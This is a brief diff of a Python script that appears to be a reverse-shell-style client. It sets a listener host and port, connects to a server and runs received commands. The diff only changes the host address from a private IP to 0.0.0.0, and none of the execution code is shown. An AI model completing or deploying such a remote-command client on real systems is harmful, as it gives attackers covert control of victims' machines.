@@ -5,7 +5,7 @@ import os
 import time
 
 # Replace with the IP and port of your listener
-SERVER_HOST = "192.168.10.246"
+SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 8080
 
 def connect_to_server():
@@ -73,3 +73,4 @@ def run_command(command):
 
 if __name__ == "__main__":
     connect_to_server()
+
